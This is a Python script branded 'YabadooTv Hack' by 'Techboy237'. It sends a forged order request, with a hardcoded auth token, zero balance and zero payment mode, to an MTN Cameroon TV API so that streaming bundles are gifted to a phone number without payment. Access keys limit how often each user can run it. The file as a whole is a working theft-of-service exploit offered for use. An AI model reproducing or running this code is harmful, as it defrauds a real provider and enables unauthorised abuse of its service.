import os
import getpass
import requests
import json
import datetime
from collections import defaultdict
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import base64
import pathlib
import pickle

# Color codes
M = "\033[1;31m"  # red
H = "\033[1;32m"  # green
B = "\033[1;34m"  # blue
Z = "\033[1;35m"  # purple
N = "\033[0m"     # reset

def banner():
    os.system("clear")
    print(f"{M}▒███████▒███████▒ ███▄ ▄███▓")
    print("▒ ▒ ██▒ ▓▒█░░▒▒ ░ ░")
    print("▒ ▄▀▒░ ▒██▒▓██ █░ ▓▒█░░▒▒")
    print("▄▀▒ ░░██░▒██ ▒██")
    print(f"▓█ ▓██▒▒TECHBOY237▒░██░▒██▒ ░")
    print(f"{B}▒▒ ▓▒█░░▒▒ ░▒░▒░▓ ░ ▒░ ░ ░")
    print("▒ ▒▒ ░░▒ ▒ ░ ▒ ▒TECHBOY237 ░")
    print("░ ▒ ░ ░ ░ ░ ▒ ░░ ▒░▒░▓")
    print("░ TECHBOY237 ░ ░ ")
    print("▒███████▒███████▒ ▒███████")
    print(f"{B}╔══════════════════════════════════════════╗{B}")
    print(f"{B}║{B}  Author   : {M}Techboy237                   {B}║{B}")
    print(f"{B}║{B}  Telegram : {B}https://t.me/AlphaTech237    {B}║{B}")
    print(f"{B}║{B}  Telegram : {B}https://t.me/techboy237      {B}║{B}")
    print(f"{B}║{B}  Version  : {H}4.0                         {B}║{B}")
    print(f"{B}╚══════════════════════════════════════════╝{B}")
    print(f'            {M}》{H}》{B}》{H}YabadooTv Hack{B}《{H}《{B}《')
    print("")

banner()

def generate_key(password, salt):
    password = password.encode()  # Convert to type bytes
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once
    return key

# Get the directory where the script is located
SCRIPT_DIR = pathlib.Path(__file__).parent.absolute()

# Path to the key file
KEY_PATH = SCRIPT_DIR / 'key.key'

# Path to the credentials file
CREDENTIALS_PATH = SCRIPT_DIR / 'credentials.json'

# Path to the history file
HISTORY_PATH = SCRIPT_DIR / 'history.json'

# Password for encrypting/decrypting data
if os.path.isfile('password.pkl'):
    with open('password.pkl', 'rb') as f:
        password = pickle.load(f)
else:
    password = getpass.getpass("Enter encryption password: ")
    with open('password.pkl', 'wb') as f:
        pickle.dump(password, f)

try:
    # Load the salt and key from the file
    with open(KEY_PATH, 'rb') as key_file:
        salt = key_file.read(16)  # Read the salt
        key = key_file.read()  # Read the key
except FileNotFoundError:
    # Generate a new salt and key
    salt = os.urandom(16)
    key = generate_key(password, salt)

    # Save salt and key to a file
    with open(KEY_PATH, 'wb') as key_file:
        key_file.write(salt)
        key_file.write(key)

    # Set file permissions to be private
    os.chmod(KEY_PATH, 0o600)

# Access key mapping
access_keys = {
    "Techboy237Blog": 1,
    "Techboy237Hack": 3,
    "Techboy237.cm": float('inf')
}

# Load the saved credentials
try:
    with open(CREDENTIALS_PATH, 'r') as f:
        data = f.read()
        fernet = Fernet(key)
        credentials = json.loads(fernet.decrypt(data.encode()).decode())
except FileNotFoundError:
    credentials = {}

# If the user's credentials are not in the file, ask for them
if 'access_key' not in credentials or 'login_security_code' not in credentials:
    access_key = getpass.getpass(prompt="Enter access key to continue: ")
    login_security_code = getpass.getpass(prompt="Enter password to login: ")
    credentials = {'access_key': access_key, 'login_security_code': login_security_code}

    # Encrypt and save the user's access key and login security code to the file
    fernet = Fernet(key)
    with open(CREDENTIALS_PATH, 'w') as f:
        f.write(fernet.encrypt(json.dumps(credentials).encode()).decode())
else:
    access_key = credentials['access_key']
    login_security_code = credentials['login_security_code']

# Check if the entered access key is valid
if access_key not in access_keys:
    print("Invalid access key. Exiting...")
    exit()

# Activation limit based on access key
activation_limit = access_keys[access_key]

# Load the history from a file
try:
    with open(HISTORY_PATH, 'r') as f:
        data = f.read()
        fernet = Fernet(key)
        history = json.loads(fernet.decrypt(data.encode()).decode())
except FileNotFoundError:
    history = defaultdict(lambda: defaultdict(int))

bundle_id = "10"
balance = "0"

gift_to = input("Enter gift_to phone number (format: xxxxxxxxx): ")
gift_to = '237' + gift_to
print("Gift to phone number: ", gift_to)

today = datetime.date.today()
seven_days_ago = today - datetime.timedelta(days=7)
str_today = str(today)
str_seven_days_ago = str(seven_days_ago)

total_usage = 0
if login_security_code in history:
    total_usage = sum(usage for date, usage in history[login_security_code].items() if str_seven_days_ago <= date <= str_today)

if total_usage >= activation_limit:
    print("You have used all your access. You will only be able to activate again after 7 days.")
    exit()

history[login_security_code][str_today] += 1

headers = {
    'Host': 'mtntv.mtncameroon.net',
    'Content-Length': '874',
    'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryFJBaBBuhjtyL3OcD',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Origin': 'https://play.yabadoo.tv',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://play.yabadoo.tv/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close'
}

data = f'''------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="auth"

80b44d972af562d02de057389345b7f6
------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="bundle_id"

{bundle_id}
------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="balance"

{balance}
------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="duration"

168
------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="disconnect_time"

0
------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="is_renew"

undefined
------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="payment_mode"

0
------WebKitFormBoundaryFJBaBBuhjtyL3OcD
Content-Disposition: form-data; name="gift_to"

{gift_to}
------WebKitFormBoundaryFJBaBBuhjtyL3OcD--
'''

response = requests.post('https://mtntv.mtncameroon.net/crudAPI_mobile/aplitv_processNewOrder', headers=headers, data=data)

if response.status_code == 202:
    result = response.json()
    if result.get('status') == 'Failed' and result.get('msg') == 'The number you are trying to gift is not valid.':
        print('Error: The phone number you entered is not valid.')
else:
    print('Error: Request failed with status code', response.status_code)
    exit()

print(response.text)

# At the end of the program, save the updated history
fernet = Fernet(key)
with open(HISTORY_PATH, 'w') as f:
    f.write(fernet.encrypt(json.dumps(history).encode()).decode())

